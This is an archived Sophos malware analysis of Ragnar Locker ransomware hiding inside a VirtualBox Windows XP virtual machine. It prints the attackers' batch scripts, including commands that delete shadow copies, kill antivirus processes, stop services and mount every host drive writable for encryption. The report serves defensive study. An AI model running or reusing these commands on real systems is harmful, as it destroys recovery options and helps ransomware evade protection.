{
    "id": "a029a7c4-159a-4b32-82f4-74a40655b442",
    "created_at": "2023-01-12T15:10:58.140141Z",
    "updated_at": "2025-03-27T02:06:05.894831Z",
    "deleted_at": null,
    "sha1_hash": "dd4ce2d8162400847da1edb6ae33011ee7773b9a",
    "title": "2020-05-21 - Ragnar Locker ransomware deploys virtual machine to dodge security",
    "authors": "",
    "file_creation_date": "2022-05-29T00:59:06Z",
    "file_modification_date": "2022-05-29T00:59:06Z",
    "file_size": 1892548,
    "plain_text": "# Ragnar Locker ransomware deploys virtual machine to dodge security\n\n**[news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)**\n\nMark Loman May 21, 2020\n\nA new ransomware attack method takes defense evasion to a new level—deploying as a full\nvirtual machine on each targeted device to hide the ransomware from view. In a recently\ndetected attack, Ragnar Locker ransomware was deployed inside an Oracle VirtualBox\nWindows XP virtual machine. The attack payload was a 122 MB installer with a 282 MB\nvirtual image inside—all to conceal a 49 kB ransomware executable.\n\nThe adversaries behind Ragnar Locker have been known to steal data from targeted\nnetworks prior to launching ransomware, to encourage victims to pay. In April, the actors\nbehind Ragnar Locker attacked the network of Energias de Portugal (EDP) and claimed to\nhave stolen 10 terabytes of sensitive company data, demanding a payment of 1,580 Bitcoin\n(approximately $11 million US) and threatening to release the data if the ransom was not\npaid.\n\nIn past attacks, the Ragnar Locker group has used exploits of managed service providers or\nattacks on Windows Remote Desktop Protocol (RDP) connections to gain a foothold on\ntargeted networks. After gaining administrator-level access to the domain of a target and\nexfiltration of data, they have used native Windows administrative tools such as Powershell\nand Windows Group Policy Objects (GPOs) to move laterally across the network to Windows\nclients and servers.\n\n\n-----\n\nIn the detected attack, the Ragnar Locker actors used a GPO task to execute Microsoft\nInstaller (msiexec.exe), passing parameters to download and silently install a 122 MB\ncrafted, unsigned MSI package from a remote web server. The primary contents of the MSI\npackage were:\n\nA working installation of an old Oracle VirtualBox hypervisor—actually, Sun xVM\nVirtualBox version 3.0.4 from August 5, 2009 (Oracle bought Sun Microsystems in\n2010).\nA virtual disk image file (VDI) named micro.vdi— an image of a stripped-down version\nof the Windows XP SP3 operating system, called MicroXP v0.82. The image includes\nthe 49 kB Ragnar Locker ransomware executable.\n\nThe virtualization software and the virtual disk image are copied to the folder C:\\Program\nFiles (x86)\\VirtualAppliances.\n\nIn addition to the VirtualBox files, the MSI also deploys an executable (called va.exe), a\nbatch file (named install.bat), and a few support files. After completing the installation, the\nMSI Installer executes va.exe, which in turn runs the install.bat batch script. The script’s first\ntask is to register and run the necessary VirtualBox application extensions VBoxC.dll and\nVBoxRT.dll, and the VirtualBox driver VboxDrv.sys:\n```\n%binapp%\\VBoxSVC.exe /reregserver\nregsvr32 /S “%binpath%\\VboxC.dll”\nrundll32 “%binpath%\\VBoxRT.dll,RTR3Init”\nsc create VBoxDRV binpath= “%binpath%\\drivers\\VboxDrv.sys” type= kernel start= auto\nerror= normal displayname= PortableVBoxDRV\nsc start VBoxDRV\n\n```\nThe script then goes on to stop the Windows Shell Hardware Detection service, to disable\nthe Windows AutoPlay notification functionality:\n```\nsc stop ShellHWDetection\n\n```\n\n-----\n\nNext, the script executes a command to delete the targeted PC s volume shadow copies, so\nvictims cannot restore older unencrypted versions of their files:\n```\nvssadmin delete shadows /all /quiet\n\n```\nThe install.bat script then goes on to enumerate all local disks, connected removable drives\nand mapped network drives on the physical machine, so they can be configured to be\naccessed from within the virtual machine:\n```\nmountvol | find “}\\” > v.txt\n(For /F %%i In (v.txt) Do (\n   Set freedrive=0\n   FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (\n      IF NOT EXIST %%d:\\ (\n         IF “!freedrive!”==”0” (\n            Set freedrive=%%d\n         )\n      )\n   )\n   mountvol !freedrive!: %%i\n   ping -n 2 127.0.0.1\n))\nSet driveid=0\nFOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (\n   IF EXIST %%d:\\ (\n      Set /a driveid+=1\n      echo ^<SharedFolder name=”!driveid!” hostPath=”%%d:\\” writable=”true”/^>\n>>sf.txt\n     )\n)\n\n```\nThese commands will write text to the VirtualBox configuration file’s Shared Folders listing,\nsuch as:\n```\n<SharedFolders>\n<SharedFolder name=\"1\" hostPath=\"C:\\\" writable=\"true\"/>\n<SharedFolder name=\"2\" hostPath=\"E:\\\" writable=\"true\"/>\n</SharedFolders>\n\n```\nTo construct the micro.xml VirtualBox configuration file, required to start the micro.vdi virtual\nmachine, the following commands are executed:\n\n\n-----\n\n```\ntype vm1.txt > micro.xml\necho ^<CPU count=”1”^> > pn.txt\ntype pn.txt >> micro.xml\ntype vm2.txt >> micro.xml\ntype sf.txt >> micro.xml\ntype vm3.txt >> micro.xml\n\n```\nThe VM is configured with 256 MB RAM, 1 CPU, a single 299 MB HDD file micro.vdi and an\nIntel PRO/1000 network adapter attached to NAT.\n\nNow the virtual environment is prepared, the install.bat command goes through a list of\nprocess names and terminates these processes so any files they have open are unlocked\nand become accessible for encryption. This list of 50 entries consists of mainly line-ofbusiness applications, database, remote management and backup applications and is stored\nin a text file. Another text file contains services names. These are tailored to the victim\norganization’s network environment, including process and service names belonging to\nendpoint protection software.\n\nWith the environment properly prepared, the install.bat script starts the virtual machine with\nthis command:\n```\n“%binpath%\\VboxHeadless.exe” –startvm micro -v off\n\n```\nHere’s an illustration of the installation process, captured by Sophos Intercept X:\n\nThe following steps can be identified in the root cause analysis (RCA) logs:\n\n\n-----\n\n1. Microsoft Installer (msiexec.exe) executes\n2. MSI package is downloaded\n3. bat is executed: cmd.exe /c “C:\\Program Files (x86)\\VirtualAppliances\\install.bat”\n4. Attempts to terminate Anti-Virus process: taskkill /IM SavService.exe /F\n5. Attempts to stop Anti-Virus service and other processes: sc stop mysql\n6. Mounts accessible networks share to available drive letters: mountvol E: \\\\?\n\n\\Volume{174f8ec6-d584-11e9-8afa-806e6f6e6963}\\\n7. Starts VirtualBox in headless mode: C:\\Program Files\n\n(x86)\\VirtualAppliances\\app64\\VBoxHeadless.exe” –startvm micro -v off\n8. Deletes shadow copies: vssadmin delete shadows /all /quiet\n\n## The Virtual Machine\n\nAs mentioned, the guest VM is a MicroXP edition of the Windows XP operating system and\nis enclosed in a single file called micro.vdi.\n\nThe ransomware executable is found at C:\\vrun.exe. The ransomware is compiled\nexclusively per victim, as the ransom note it drops contains the victim’s name.\n\nTo start the ransomware, a batch file called vrun.bat is located in C:\\Documents and\nSettings\\Administrator\\Start Menu\\Programs\\Startup\\.\n\n\n-----\n\nThis batch file contains the following commands:\n```\n@echo off\nping -n 11 127.0.0.1\nnet use E: \\\\VBOXSVR\\1\nfor %%d in (2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28\n29 30 31 32 33) do (if exist \\\\VBOXSVR\\%%d net use *\\\\VBOXSVR\\%%d)\n:a\nping -n 3 127.0.0.1\nC:\\vrun.exe -vm\ngoto a\n\n```\nThis script mounts the shared drives configured in micro.xml on the host machine, inside the\nguest VM. This means that the ransomware in the guest environment can now fully access\nthe host’s local disks, mapped network and removable drives. Now all drives are mounted,\nthe ransomware vrun.exe is executed.\nThe vrun.exe ransomware program has a couple of possible command line options:\n\n-backup\n-list\n-force\n-vm\n\nThe last one is used by this setup, and in this mode the ransomware encrypts the files on all\navailable mapped network drives.\n\nThen the ransomware drops the customized ransom note:\n\n\n-----\n\nSince the vrun.exe ransomware application runs inside the virtual guest machine, its process\nand behaviors can run unhindered, because they’re out of reach for security software on the\nphysical host machine. The data on disks and drives accessible on the physical machine are\nattacked by the “legitimate” VboxHeadless.exe process, the VirtualBox virtualization\nsoftware.\n\n## Acknowledgments\n\nThe following Sophos staff contributed to this report:\n\nVikas Singh\nGabor Szappanos\nMark Loman\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-21 - Ragnar Locker ransomware deploys virtual machine to dodge security.pdf"
    ],
    "report_names": [
        "2020-05-21 - Ragnar Locker ransomware deploys virtual machine to dodge security.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536258,
    "ts_updated_at": 1743041165,
    "ts_creation_date": 1653785946,
    "ts_modification_date": 1653785946,
    "files": {
        "pdf": "https://archive.orkl.eu/dd4ce2d8162400847da1edb6ae33011ee7773b9a.pdf",
        "text": "https://archive.orkl.eu/dd4ce2d8162400847da1edb6ae33011ee7773b9a.txt",
        "img": "https://archive.orkl.eu/dd4ce2d8162400847da1edb6ae33011ee7773b9a.jpg"
    }
}